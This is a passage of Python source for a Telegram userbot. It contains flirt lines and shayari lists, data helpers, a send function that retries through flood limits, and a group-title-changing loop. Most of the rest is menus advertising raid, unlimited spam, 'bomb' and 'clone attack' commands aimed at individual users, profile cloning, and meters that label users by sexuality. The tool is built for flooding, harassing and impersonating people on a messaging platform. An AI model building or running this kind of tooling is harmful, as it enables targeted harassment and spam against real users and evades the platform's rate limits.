            "Kya tum Starbucks ho? \nKyunki main har din tumhara naam pukaarna chahta hoon. ☕😄",
            "Mere papa ne mujhe sikhaya hai ki, \nAage badhna chahiye, toh kya main tumhara crush ban sakta hoon? 🏃💨",
            "Tumhare numbers mujhe lottery lage, \nKyuki tum toh jackpot ho yaar! 🎰💰",
            "Meri battery low hai, \nKya tum mere charger ban sakte ho? 🔋❤️",
            "Kya tum doctor ho? \nKyunki mera dil dekh ke toh tumne dhadkana sikha diya. 👨‍⚕️💓",
            "Tumhari height kya hai? \nKyunki lagta hai tum heaven se chhidi hui ho. 📏👼",
            "Mere paas ek phone hai, \nPar main tumhe call nahi karta, kyuki tum meri screen pe ho. 📱✨",
            "Kya tumhe raat mein chand dikhta hai? \nKyunki woh toh meri pocket mein hai, par tum toh ho sitaron se bhi upar. 🌙⭐",
            "Main kal se gym jaana shuru kar raha hoon, \nTumhara naam uthane ke liye. 💪😂",
            "Agar tum 'Sorry' bolti ho toh main maan jaunga, \nPar tum toh bolti hi 'I love you' ho. 😂❤️",
            "Tumhari aankhon mein pyaar hai ya paani, \nMaine toh dooba marne ka plan banaya. 🏊💀",
            "Kya tumhe pata hai kiski height 6 feet hai? \nMeri love story ka plot twist! 😏📏",
            "Mera DNA toh tumse match karta hai, \nKyunki main toh tumhara hi bana hoon. 🧬😘",
            "Tumse milke lagta hai jaise, \nSach mein pyaar hota hai, bas tumhara nahi milta. 😅🫠"
        ]

        # ─── RANDOM SHAYARI FOR BESTFRIEND, MARRIAGE, DIVORCE ───
        BESTFRIEND_SHAYARI = [
            "💖 *Dil ki baat kehni hai, sun lo meri jaan,*\n🌸 *Tum bin adhoori hai yeh dastaan.*\n💫 *Kya tum banogi/banoge meri/mera best friend?* 🤗",
            "🌟 *Tum ho meri khushi ka raaz,*\n🌺 *Tum bin jeena hai aawaaz.*\n🤗 *Kya tum best friend banogi/banoge?*",
            "🎈 *Zindagi mein tum aaye toh rang hai,*\n🌹 *Har pal tumse hi sang hai.*\n💕 *Best friend bano meri jaan?*",
            "✨ *Tum ho meri kahani ka aakhri hissa,*\n📖 *Tum bin adhoora hai yeh kissa.*\n🤝 *Kya tum meri best friend banogi/banoge?*",
            "🌸 *Phoolon ki tarah tum ho khilte,*\n🌼 *Tum bin dil hai kaise milte?*\n💖 *Best friend ka rishta nibhaoge?*",
            "💫 *Tum ho meri life ka sundar sapna,*\n🌙 *Tum bin sab hai apna-apna.*\n🧸 *Kya tum best friend banogi/banoge?*",
            "🌺 *Dosti ki raah mein tumse mila,*\n🌷 *Meri duniya tumse hi saja.*\n💕 *Best friend banoge meri jaan?*",
            "💝 *Tum ho meri khushiyon ki wajah,*\n🎉 *Tum bin har din hai saza.*\n🤗 *Best friend kya tum banogi/banoge?*",
            "🌟 *Tum ho meri roshni ka silsila,*\n🌙 *Tum bin sab hai bewajah.*\n💖 *Best friend bano na?*",
            "🎀 *Tum se hai meri zindagi aasaan,*\n🌸 *Tum bin hai mushkil har armaan.*\n🤝 *Best friend banogi/banoge?*"
        ]

        MARRIAGE_SHAYARI = [
            "💍 *Chand sitare sab hai gawah,*\n🌹 *Tum bin jeena hai saza.*\n💕 *Kya tum mujhse shaadi karogi/karoge?*",
            "💒 *Meri har dua mein tum ho shamil,*\n🌺 *Tum bin har khushi hai mushkil.*\n💞 *Shaadi karoge?*",
            "🌸 *Pyaar ki raah mein tumse mila,*\n🌹 *Meri jaan ban gaye ho tum.*\n💍 *Shaadi ka vaada karo?*",
            "💖 *Tum ho meri zindagi ka maqsad,*\n🌟 *Tum bin hai sab kuch bekaar.*\n🤵‍♀️🤵‍♂️ *Shaadi karogi/karoge?*",
            "🎉 *Har lamha tumhare sang bitana hai,*\n🌙 *Tum bin jeena nahi, marna hai.*\n💏 *Shaadi ka irada hai kya?*",
            "💕 *Tumse hai pyaar, yeh sach hai,*\n🌹 *Tum bin zindagi kuch nahi.*\n💍 *Shaadi karogi/karoge?*",
            "🌹 *Tum ho meri subah ki pehli kiran,*\n🌙 *Tum bin meri raat hai viran.*\n💒 *Shaadi karte ho?*",
            "💗 *Dil ki dhadkan tum hi ho,*\n🌟 *Tum bin sab kuch hai khamosh.*\n💍 *Shaadi ka waqt aa gaya?*",
            "💖 *Pyaar ki gehraai mein tum ho,*\n🌊 *Tum bin meri manzil hai kho.*\n💏 *Shaadi karogi/karoge?*",
            "💞 *Tumse hai mera har khwab,*\n🌙 *Tum bin meri zindagi hai azaab.*\n💍 *Shaadi ka irada hai?*"
        ]

        DIVORCE_SHAYARI = [
            "💔 *Rishton ki dor hai kamzor,*\n🌪️ *Ab nahi sahega yeh dard-e-dil.*\n❓ *Kya tum talaq chahti ho/chahte ho?*",
            "😢 *Pyaar tha, par ab hai doori,*\n💔 *Nahi rahi ab koi majboori.*\n📜 *Talaq de do?*",
            "💔 *Toot gaye sapne saare,*\n🌧️ *Ab nahi rahe hum tumhaare.*\n❓ *Kya talaq chahiye?*",
            "💔 *Ishq mein thi humko khushi,*\n😣 *Ab toh bas hai tanhai.*\n📄 *Talaq mangte ho?*",
            "💔 *Vaade tod kar tumne,*\n😤 *Humse hai ab na koi rishta.*\n🗑️ *Talaq do?*",
            "💔 *Zindagi mein ab nahi ho tum,*\n🌪️ *Mann mein bas gayi hai udaasi.*\n❌ *Talaq ki baat karoge?*",
            "💔 *Pyaar ki kami hai, saath nahi,*\n😭 *Ab aur nahi yeh dard sahti.*\n📜 *Talaq de do?*",
            "💔 *Apne the, par ab begane,*\n😤 *Kyun baandhein yeh rishte begaane.*\n❓ *Talaq le lo?*",
            "💔 *Mann mein ab kuch nahi bas gaye,*\n🍂 *Rishton ke patte jhad gaye.*\n🗑️ *Talaq do?*",
            "💔 *Tum bin hai jeena mushkil,*\n😣 *Par tum ho toh aur mushkil.*\n📄 *Talaq mangte ho?*"
        ]

        # ─── LOAD/SAVE FUNCTIONS ───
        def load_admins():
            try:
                if not os.path.isfile(ADMINS_FILE):
                    return set()
                with open(ADMINS_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
                return {int(x) for x in data} if isinstance(data, list) else set()
            except:
                return set()

        def save_admins():
            try:
                with open(ADMINS_FILE, "w", encoding="utf-8") as f:
                    json.dump(sorted(user_bot.admins), f, indent=2)
            except:
                pass

        def load_notes():
            try:
                if not os.path.isfile(NOTES_FILE):
                    return {}
                with open(NOTES_FILE, "r", encoding="utf-8") as f:
                    raw = json.load(f)
                return {int(k): str(v) for k, v in raw.items() if isinstance(raw, dict)}
            except:
                return {}

        def save_notes():
            try:
                with open(NOTES_FILE, "w", encoding="utf-8") as f:
                    json.dump(user_bot.notes, f, ensure_ascii=False, indent=2)
            except:
                pass

        def load_banner():
            try:
                if not os.path.isfile(BANNER_FILE):
                    return None
                with open(BANNER_FILE, "r", encoding="utf-8") as f:
                    raw = f.read().strip()
                if ":" not in raw:
                    return None
                chat, msg = raw.split(":", 1)
                return (int(chat), int(msg))
            except:
                return None

        def save_banner():
            try:
                if not user_bot.menu_banner_msg:
                    if os.path.isfile(BANNER_FILE):
                        os.remove(BANNER_FILE)
                    return
                with open(BANNER_FILE, "w", encoding="utf-8") as f:
                    f.write(f"{user_bot.menu_banner_msg[0]}:{user_bot.menu_banner_msg[1]}")
            except:
                pass

        def load_common_spam():
            try:
                if not os.path.isfile(COMMON_SPAM_FILE):
                    return []
                with open(COMMON_SPAM_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
                return [str(x) for x in data] if isinstance(data, list) else []
            except:
                return []

        def save_common_spam():
            try:
                with open(COMMON_SPAM_FILE, "w", encoding="utf-8") as f:
                    json.dump(user_bot.spam_texts, f, ensure_ascii=False, indent=2)
            except:
                pass

        # ─── LOAD INITIAL DATA ───
        user_bot.admins = load_admins()
        user_bot.notes = load_notes()
        user_bot.menu_banner_msg = load_banner()
        user_bot.spam_texts = load_common_spam()

        # ─── FLOOD-SAFE SEND ───
        async def safe_send(chat, text, reply_to=None, retries=3):
            for attempt in range(retries):
                try:
                    return await user_bot.send_message(chat, text, reply_to=reply_to)
                except FloodWaitError as fw:
                    await asyncio.sleep(fw.seconds + 1)
                    continue
                except Exception:
                    await asyncio.sleep(1)
            return None

        # ─── HELPER FUNCTIONS ───
        async def safe_edit(event, text):
            try:
                return await event.edit(text)
            except:
                try:
                    return await event.reply(text)
                except:
                    return

        async def get_targets(event, arg=""):
            targets = set()
            if event.is_reply:
                try:
                    r = await event.get_reply_message()
                    if r and r.sender_id:
                        targets.add(int(r.sender_id))
                except:
                    pass
            if arg:
                for part in arg.strip().split():
                    if part.isdigit():
                        targets.add(int(part))
                    else:
                        try:
                            ent = await user_bot.get_entity(part)
                            if ent and hasattr(ent, "id"):
                                targets.add(int(ent.id))
                        except:
                            pass
            try:
                me2 = await user_bot.get_me()
                targets.discard(me2.id)
            except:
                pass
            return targets

        def is_admin(uid):
            return uid in OWNER_IDS or uid in user_bot.admins

        # ─── NC LOOP ───
        async def nc_loop(chat_id, lang, text):
            if lang == "hindi":
                patterns = HINDINC_PATTERNS
            elif lang == "urdu":
                patterns = URDU_PATTERNS
            elif lang == "bengali":
                patterns = BENGALI_PATTERNS
            elif lang == "bihari":
                patterns = BIHARI_PATTERNS
            elif lang == "english":
                patterns = ENGLISH_PATTERNS
            elif lang == "emoji":
                patterns = None
            else:
                return

            i = 0
            while True:
                if not user_bot.NC_STATE.get("active", False):
                    break
                try:
                    if lang == "emoji":
                        emoji = EMOJI_NC_EMOJIS[i % len(EMOJI_NC_EMOJIS)]
                        new_title = EMOJI_NC_PATTERN.format(text=text, emoji=emoji)
                    else:
                        pattern = patterns[i % len(patterns)]
                        new_title = pattern.format(text=text)
                    try:
                        await user_bot(functions.channels.EditTitleRequest(channel=chat_id, title=new_title))
                    except Exception:
                        try:
                            await user_bot(functions.messages.EditChatTitleRequest(chat_id=chat_id, title=new_title))
                        except Exception:
                            pass
                    i += 1
                    await asyncio.sleep(1.5)
                except asyncio.CancelledError:
                    break
                except Exception as e:
                    print(f"NC loop error: {e}")
                    await asyncio.sleep(2)

        # ─── COMMAND REGISTRY ───
        commands = {}

        def register_cmd(name, needs_reply=False, group_only=False):
            def decorator(func):
                key = name.lower().strip()
                commands[key] = {
                    "func": func,
                    "needs_reply": needs_reply,
                    "group_only": group_only,
                }
                return func
            return decorator

        # ─── OWNER-ONLY COMMANDS ───
        owner_only_commands = {
            "addtext", "edittext", "deltext", "cleartext",
            "spraydelay", "addadmin", "deladmin"
        }

        # ─── ATTRACTIVE MENUS ───
        @register_cmd("menu")
        async def cmd_menu(event, _):
            menu = (
                "╔══════════════════════════════════════════════════════════════╗\n"
                "║            ✦ ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐔𝐒𝐄𝐑𝐁𝐎𝐓 ✦             ║\n"
                "╠══════════════════════════════════════════════════════════════╣\n"
                "║                                                              ║\n"
                "║  👑 Owner  : ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️                          ║\n"
                "║  📦 Commands: 85+                                           ║\n"
                "║  🔥 Prefix  : `.` (Dot) or `!` (Owner only)                ║\n"
                "║                                                              ║\n"
                "║  ────〔 📖 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔 〕────                            ║\n"
                "║                                                              ║\n"
                "║  📌 `.menu1` → 👑 Admin, 🔇 Mute & 🧹 Group                ║\n"
                "║  📌 `.menu2` → ⚔️ Raid Engine                              ║\n"
                "║  📌 `.menu3` → 💣 Spam & 📝 Text Manager                   ║\n"
                "║  📌 `.menu4` → 🛡️ Protection, 🖼️ PFP & ❤️ Auto          ║\n"
                "║  📌 `.menu5` → 🛠️ Tools, 🎵 Music, 🧠 Notes, 🎮 Fun      ║\n"
                "║  📌 `.menu6` → 🎭 FUN FEATURES (FULL)                     ║\n"
                "║  📌 `.menu7` → 🎭 FUN METERS & MORE                        ║\n"
                "║                                                              ║\n"
                "║  💡 Use `.cmds` for a complete list.                        ║\n"
                "║  🔒 Owner‑only commands are marked in `.menu5`.             ║\n"
                "║                                                              ║\n"
                "╚══════════════════════════════════════════════════════════════╝"
            )
            await safe_edit(event, menu)
            if user_bot.menu_banner_msg:
                chat_id2, msg_id = user_bot.menu_banner_msg
                try:
                    msg = await user_bot.get_messages(chat_id2, ids=msg_id)
                    await user_bot.send_file(
                        event.chat_id,
                        file=msg.media,
                        caption="⚡  **⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐄ɴᴛᴇʀs** ❤️‍🔥"
                    )
                except:
                    pass

        @register_cmd("menu1")
        async def cmd_menu1(event, _):
            menu = (
                "╔══════════════════════════════════════════════════════════════╗\n"
                "║            👑 𝐀𝐃𝐌𝐈𝐍 & 🔇 𝐌𝐔𝐓𝐄 & 🧹 𝐆𝐑𝐎𝐔𝐏            ║\n"
                "╠══════════════════════════════════════════════════════════════╣\n"
                "║                                                              ║\n"
                "║  ┌───〔 👑 𝐀𝐃𝐌𝐈𝐍 〕───┐                                   ║\n"
                "║  │  `.admins` → View all admins                             ║\n"
                "║  │  `.addadmin @user` (or reply) → Make admin               ║\n"
                "║  │  `.deladmin @user` (or reply) → Remove admin             ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  ┌───〔 🔇 𝐌𝐔𝐓𝐄 & 𝐑𝐄𝐒𝐓𝐑𝐈𝐂𝐓 〕───┐                   ║\n"
                "║  │  `.mute @user` → Local mute                              ║\n"
                "║  │  `.unmute @user` → Local unmute                          ║\n"
                "║  │  `.gmute @user` → Global mute                            ║\n"
                "║  │  `.gunmute @user` → Global unmute                        ║\n"
                "║  │  `.mutelist` → Check mute status                         ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  ┌───〔 🧹 𝐆𝐑𝐎𝐔𝐏 𝐌𝐎𝐃 〕───┐                           ║\n"
                "║  │  `.lock` → Lock group messages                           ║\n"
                "║  │  `.unlock` → Unlock group                               ║\n"
                "║  │  `.purge <count>` → Delete N messages (max 200)          ║\n"
                "║  │  `.throw @user` → Kick user                              ║\n"
                "║  │  `.addbots <n>` → Add N bots from list                   ║\n"
                "║  │  `.tagall <msg>` → Mention all members (admin)           ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  📌 `.menu` → Main menu                                     ║\n"
                "║                                                              ║\n"
                "╚══════════════════════════════════════════════════════════════╝"
            )
            await safe_edit(event, menu)

        @register_cmd("menu2")
        async def cmd_menu2(event, _):
            menu = (
                "╔══════════════════════════════════════════════════════════════╗\n"
                "║                   ⚔️ 𝐑𝐀𝐈𝐃 𝐄𝐍𝐆𝐈𝐍𝐄                      ║\n"
                "╠══════════════════════════════════════════════════════════════╣\n"
                "║                                                              ║\n"
                "║  ┌───〔 💬 𝐑𝐄𝐏𝐋𝐘 𝐑𝐀𝐈𝐃 〕───┐                          ║\n"
                "║  │  `.reply @user` → Start reply raid                       ║\n"
                "║  │  `.sreply @user` → Stop reply raid                       ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  ┌───〔 🤣 𝐑𝐑 𝐑𝐀𝐈𝐃 (Reply + React) 〕───┐              ║\n"
                "║  │  `.rr @user` → Start RR raid                            ║\n"
                "║  │  `.srr @user` → Stop RR raid                            ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  ┌───〔 🚩 𝐅𝐋𝐀𝐆 𝐑𝐀𝐈𝐃 〕───┐                          ║\n"
                "║  │  `.flag @user` → Start flag raid                         ║\n"
                "║  │  `.sflag @user` → Stop flag raid                         ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  ┌───〔 💗 𝐇𝐄𝐀𝐑𝐓 𝐑𝐀𝐈𝐃 〕───┐                          ║\n"
                "║  │  `.hrr @user` → Start heart raid                         ║\n"
                "║  │  `.shrr @user` → Stop heart raid                         ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  ┌───〔 😈 𝐆𝐎𝐃 𝐑𝐀𝐈𝐃 (4 replies) 〕───┐                 ║\n"
                "║  │  `.replygod @user` → Start god raid                      ║\n"
                "║  │  `.sgod @user` → Stop god raid                           ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  ┌───〔 🎯 𝐂𝐔𝐒𝐓𝐎𝐌 𝐑𝐀𝐈𝐃 〕───┐                        ║\n"
                "║  │  `.customraid <text> <count>` (reply to user)            ║\n"
                "║  │  `.stopcustomraid @user` → Stop                          ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  ┌───〔 📜 𝐒𝐇𝐀𝐘𝐀𝐑𝐈 𝐑𝐀𝐈𝐃 〕───┐                      ║\n"
                "║  │  `.shayariraid @user <count>`                            ║\n"
                "║  │  `.sshayariraid @user` → Stop                            ║\n"
                "║  │  `.shayarilist` → View all shayari                       ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  ┌───〔 💋 𝐑𝐈𝐙𝐙 𝐑𝐀𝐈𝐃 〕───┐                          ║\n"
                "║  │  `.rizzraid @user <count>`                               ║\n"
                "║  │  `.srizzraid @user` → Stop                               ║\n"
                "║  │  `.rizzlist` → View all rizz lines                       ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  📌 `.menu` → Main menu                                     ║\n"
                "║                                                              ║\n"
                "╚══════════════════════════════════════════════════════════════╝"
            )
            await safe_edit(event, menu)

        @register_cmd("menu3")
        async def cmd_menu3(event, _):
            menu = (
                "╔══════════════════════════════════════════════════════════════╗\n"
                "║           💣 𝐒𝐏𝐀𝐌 & 📝 𝐓𝐄𝐗𝐓 𝐌𝐀𝐍𝐀𝐆𝐄𝐑              ║\n"
                "╠══════════════════════════════════════════════════════════════╣\n"
                "║                                                              ║\n"
                "║  ┌───〔 💣 𝐒𝐏𝐀𝐌 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 〕───┐                    ║\n"
                "║  │  `.spray <text>` → Unlimited spam                        ║\n"
                "║  │  `.dspray` → Stop any spray                              ║\n"
                "║  │  `.tspray <num>` → Spam saved text (from .listtexts)     ║\n"
                "║  │  `.rspray` → Random saved text spam                      ║\n"
                "║  │  `.multispray <count>` → Rotate all saved texts          ║\n"
                "║  │  `.countspray <n> <text>` → Exactly N times              ║\n"
                "║  │  `.spraydelay <sec>` → Adjust speed (owner only)         ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  ┌───〔 📝 𝐓𝐄𝐗𝐓 𝐌𝐀𝐍𝐀𝐆𝐄𝐑 (Owner only) 〕───┐         ║\n"
                "║  │  `.addtext <text>` → Save a text                         ║\n"
                "║  │  `.listtexts` → Show all saved texts                     ║\n"
                "║  │  `.edittext <num> <new>` → Edit a text                   ║\n"
                "║  │  `.deltext <num>` → Delete a text                        ║\n"
                "║  │  `.cleartext confirm` → Delete all texts                 ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  📌 `.menu` → Main menu                                     ║\n"
                "║                                                              ║\n"
                "╚══════════════════════════════════════════════════════════════╝"
            )
            await safe_edit(event, menu)

        @register_cmd("menu4")
        async def cmd_menu4(event, _):
            menu = (
                "╔══════════════════════════════════════════════════════════════╗\n"
                "║  🛡️ 𝐏𝐑𝐎𝐓𝐄𝐂𝐓𝐈𝐎𝐍 & 🖼️ 𝐆𝐑𝐎𝐔𝐏 𝐏𝐅𝐏 & ❤️ 𝐀𝐔𝐓𝐎  ║\n"
                "╠══════════════════════════════════════════════════════════════╣\n"
                "║                                                              ║\n"
                "║  ┌───〔 🛡️ 𝐀𝐍𝐓𝐈-𝐃𝐄𝐋𝐄𝐓𝐄 〕───┐                       ║\n"
                "║  │  `.antidel on` → Enable protection                       ║\n"
                "║  │  `.antidel off` → Disable                                ║\n"
                "║  │  `.antidel` → Show status                                ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  ┌───〔 👁️ 𝐖𝐀𝐓𝐂𝐇𝐒𝐏𝐀𝐌 〕───┐                         ║\n"
                "║  │  `.watchspam @user <limit> <sec>`                        ║\n"
                "║  │  `.unwatchspam @user` → Remove watch                     ║\n"
                "║  │  `.unwatchspam` → Remove all in chat                     ║\n"
                "║  │  `.watchlist` → Show active watches                      ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  ┌───〔 🖼️ 𝐆𝐑𝐎𝐔𝐏 𝐏𝐅𝐏 𝐂𝐇𝐀𝐍𝐆𝐄𝐑 〕───┐                ║\n"
                "║  │  `.setgpfp` (reply with image) → Set as group PFP        ║\n"
                "║  │  `.addgpfp` → Add image to pool                          ║\n"
                "║  │  `.listgpfp` → Show pool                                 ║\n"
                "║  │  `.autogpfp <sec>` → Auto-rotate every N seconds         ║\n"
                "║  │  `.stopgpfp` → Stop rotation                             ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  ┌───〔 ❤️ 𝐀𝐔𝐓𝐎 𝐒𝐘𝐒𝐓𝐄𝐌 〕───┐                       ║\n"
                "║  │  `.ar <emoji>` → Auto-react to your own msgs             ║\n"
                "║  │  `.sar` → Disable auto-react                             ║\n"
                "║  │  `.react @user <emoji>` → React to target's msgs         ║\n"
                "║  │  `.unreact @user` → Remove target                        ║\n"
                "║  │  `.reactlist` → Show all targets                         ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  📌 `.menu` → Main menu                                     ║\n"
                "║                                                              ║\n"
                "╚══════════════════════════════════════════════════════════════╝"
            )
            await safe_edit(event, menu)

        @register_cmd("menu5")
        async def cmd_menu5(event, _):
            menu = (
                "╔══════════════════════════════════════════════════════════════╗\n"
                "║  🛠️ 𝐓𝐎𝐎𝐋𝐒 & 🎵 𝐌𝐔𝐒𝐈𝐂 & 🎮 𝐅𝐔𝐍 & 👑 𝐎𝐖𝐍𝐄𝐑  ║\n"
                "╠══════════════════════════════════════════════════════════════╣\n"
                "║                                                              ║\n"
                "║  ┌───〔 🛠️ 𝐓𝐎𝐎𝐋𝐒 〕───┐                                ║\n"
                "║  │  `.tts <text> [lang]` → Text-to-Speech                   ║\n"
                "║  │  `.qrcode <text>` → Generate QR code                     ║\n"
                "║  │  `.fancy <text>` → Fancy text styles                     ║\n"
                "║  │  `.style <text>` → Bold/Italic/Mono                      ║\n"
                "║  │  `.emoji <text>` → Add random emojis                     ║\n"
                "║  │  `.calc <expr>` → Calculate                              ║\n"
                "║  │  `.weather <city>` → Weather info                        ║\n"
                "║  │  `.ip <ip>` → IP location                                ║\n"
                "║  │  `.short <url>` → Shorten URL                            ║\n"
                "║  │  `.info @user` → User info                               ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  ┌───〔 🎵 𝐌𝐔𝐒𝐈𝐂 〕───┐                                ║\n"
                "║  │  `.music <song>` → Send as voice note                    ║\n"
                "║  │  `.dmusic <song>` → Download MP3 (320kbps)               ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  ┌───〔 🧠 𝐍𝐎𝐓𝐄𝐒 〕───┐                                ║\n"
                "║  │  `.notesadd <text>` → Save note                          ║\n"
                "║  │  `.noteslist` → View all notes                           ║\n"
                "║  │  `.notesdelete <id>` → Delete note                       ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  ┌───〔 🎮 𝐅𝐔𝐍 & 𝐒𝐓𝐀𝐓𝐔𝐒 〕───┐                      ║\n"
                "║  │  `.ping` → Latency                                       ║\n"
                "║  │  `.status` → Uptime & stats                              ║\n"
                "║  │  `.flip` → Coin flip                                     ║\n"
                "║  │  `.dice` → Dice roll                                     ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  ┌───〔 👑 𝐎𝐖𝐍𝐄𝐑-𝐎𝐍𝐋𝐘 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 〕───┐            ║\n"
                "║  │  `.spraydelay <sec>` → Adjust spray speed                ║\n"
                "║  │  `.addtext`, `.edittext`, `.deltext`, `.cleartext`       ║\n"
                "║  │  `.addadmin` & `.deladmin`                               ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  ┌───〔 🔓 𝐀𝐃𝐌𝐈𝐍-𝐀𝐂𝐂𝐄𝐒𝐒𝐈𝐁𝐋𝐄 〕───┐                ║\n"
                "║  │  `.nc set <lang> <text>` → Name Changer                  ║\n"
                "║  │      (hindi/urdu/english/bengali/bihari/emoji)           ║\n"
                "║  │  `.nc stop` → Stop Name Changer                          ║\n"
                "║  │  `.copy @user` → Clone user's profile                    ║\n"
                "║  │  `.normal` → Restore your original profile               ║\n"
                "║  │  `.banner` (reply with image) → Set menu banner          ║\n"
                "║  │  `.rembanner` → Remove banner                            ║\n"
                "║  └───────────────────────────────┘                          ║\n"
                "║                                                              ║\n"
                "║  📌 `.menu` → Main menu                                     ║\n"
                "║                                                              ║\n"
                "╚══════════════════════════════════════════════════════════════╝"
            )
            await safe_edit(event, menu)

        @register_cmd("menu6")
        async def cmd_menu6(event, _):
            menu = (
                "╔══════════════════════════════════════════════════════════════╗\n"
                "║              🎭 FUN FEATURES (FULL)                         ║\n"
                "╠══════════════════════════════════════════════════════════════╣\n"
                "║  ┌───〔 FREEZE SYSTEM 〕───┐\n"
                "║  │  .freeze @user → Freeze user's messages                ║\n"
                "║  │  .unfreeze @user → Unfreeze user                       ║\n"
                "║  └───────────────────────────────┘\n"
                "║  ┌───〔 GHOST MODE 〕───┐\n"
                "║  │  .ghost on → Enable ghost mode (invisible)             ║\n"
                "║  │  .ghost off → Disable ghost mode                       ║\n"
                "║  └───────────────────────────────┘\n"
                "║  ┌───〔 BOMB SYSTEM 〕───┐\n"
                "║  │  .bomb @user <count> → Bomb user with messages         ║\n"
                "║  │  .stbomb @user → Stop bombing user                     ║\n"
                "║  └───────────────────────────────┘\n"
                "║  ┌───〔 MINDFUCK MODE 〕───┐\n"
                "║  │  .mindfuck on → Enable mindfuck mode                   ║\n"
                "║  │  .mindfuck off → Disable mindfuck                     ║\n"
                "║  └───────────────────────────────┘\n"
                "║  ┌───〔 SILENT KILL 〕───┐\n"
                "║  │  .silentkill @user → Silently remove user's msgs       ║\n"
                "║  │  .ssilentkill @user → Stop silent kill                 ║\n"
                "║  └───────────────────────────────┘\n"
                "║  ┌───〔 VOID MODE 〕───┐\n"
                "║  │  .void @user → Send user to void (hide all msgs)       ║\n"
                "║  │  .svoid @user → Stop void mode                         ║\n"
                "║  └───────────────────────────────┘\n"
                "║  ┌───〔 CLONE ATTACK 〕───┐\n"
                "║  │  .clone @user <count> → Clone user's messages          ║\n"
                "║  │  .sclone @user → Stop clone attack                     ║\n"
                "║  └───────────────────────────────┘\n"
                "║  ┌───〔 DEATHNOTE 〕───┐\n"
                "║  │  .deathnote @user <msg> → Send death note              ║\n"
                "║  │  .sdeathnote @user → Stop death note spam              ║\n"
                "║  └───────────────────────────────┘\n"
                "║  ┌───〔 CHAOS MODE 〕───┐\n"
                "║  │  .chaos on → Enable chaos mode                         ║\n"
                "║  │  .chaos off → Disable chaos mode                       ║\n"
                "║  └───────────────────────────────┘\n"
                "║  ┌───〔 HACK MODE 〕───┐\n"
                "║  │  .hack @user → Start hack simulation                   ║\n"
                "║  │  .shack @user → Stop hack simulation                   ║\n"
                "║  └───────────────────────────────┘\n"
                "║  ┌───〔 VIRUS MODE 〕───┐\n"
                "║  │  .virus on → Enable virus mode                         ║\n"
                "║  │  .virus off → Disable virus mode                       ║\n"
                "║  └───────────────────────────────┘\n"
                "║  ┌───〔 BLACKOUT MODE 〕───┐\n"
                "║  │  .blackout @user → Blackout user's messages            ║\n"
                "║  │  .sblackout @user → Stop blackout                      ║\n"
                "║  └───────────────────────────────┘\n"
                "║                                                              ║\n"
                "║  📌 .menu → Main menu                                     ║\n"
                "║                                                              ║\n"
                "╚══════════════════════════════════════════════════════════════╝"
            )
            await safe_edit(event, menu)

        @register_cmd("menu7")
        async def cmd_menu7(event, _):
            menu = (
                "╔══════════════════════════════════════════════════════════════╗\n"
                "║            🎭 FUN METERS & MORE                             ║\n"
                "╠══════════════════════════════════════════════════════════════╣\n"
                "║  ┌───〔 📊 FUN METERS 〕───┐\n"
                "║  │  .studmeter @user → Stud %                            ║\n"
                "║  │  .looks @user → Looks %                               ║\n"
                "║  │  .gay @user → Gay %                                   ║\n"
                "║  │  .lesbian @user → Lesbian %                           ║\n"
                "║  │  .straight @user → Straight %                         ║\n"
                "║  │  .bi @user → Bi %                                     ║\n"
                "║  │  .trans @user → Trans %                               ║\n"
                "║  │  .simp @user → Simp %                                 ║\n"
                "║  │  .chad @user → Chad %                                 ║\n"
                "║  │  .friendly @user → Friendly %                         ║\n"
                "║  │  .rizz @user → Rizz Meter (1-100)                    ║\n"
                "║  │  .iq @user → IQ Score (1-200)                        ║\n"
                "║  └───────────────────────────────┘\n"
                "║  ┌───〔 💖 BEST FRIEND? 〕───┐\n"
                "║  │  .bestfrnd @user → Ask with poetic style & buttons    ║\n"
                "║  └───────────────────────────────┘\n"
                "║  ┌───〔 💔 DIVORCE & 💍 MARRIAGE 〕───┐\n"
                "║  │  .divorce @user → Ask with Yes/No buttons             ║\n"
                "║  │  .marriage @user → Ask with Yes/No buttons            ║\n"
                "║  └───────────────────────────────┘\n"
                "║                                                              ║\n"
                "║  📌 .menu → Main menu                                     ║\n"
                "║                                                              ║\n"
                "╚══════════════════════════════════════════════════════════════╝"
            )
            await safe_edit(event, menu)

        # ─── FUN METERS ───
